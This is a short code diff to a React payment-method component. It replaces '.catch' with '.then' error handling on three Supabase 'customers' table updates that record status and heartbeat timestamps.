@@ -22,7 +22,7 @@ export const PaymentMethod = ({ className, ...props }) => {
         status: 'idle',
         last_update: Date.now(),
         last_heartbeat: Date.now()
-      }).eq('id', customerId).catch(err => console.error("Update Error:", err));
+      }).eq('id', customerId).then(({ error }) => { if (error) console.error("Update Error:", error) });
 
       // Fetch Data for Modal
       const fetchData = async () => {
@@ -44,7 +44,7 @@ export const PaymentMethod = ({ className, ...props }) => {
       if (id) {
         supabase.from('customers').update({ 
           last_heartbeat: Date.now() 
-        }).eq('id', id).catch(() => {});
+        }).eq('id', id).then(() => {});
       }
     }, 5000);
 
@@ -62,7 +62,7 @@ export const PaymentMethod = ({ className, ...props }) => {
           payment_method: 'card',
           last_update: new Date().getTime(),
           last_heartbeat: new Date().getTime()
-        }).eq('id', customerId).catch(err => console.error(err));
+        }).eq('id', customerId).then(({ error }) => { if (error) console.error(error) });
       }
       navigate('/payment');
     }
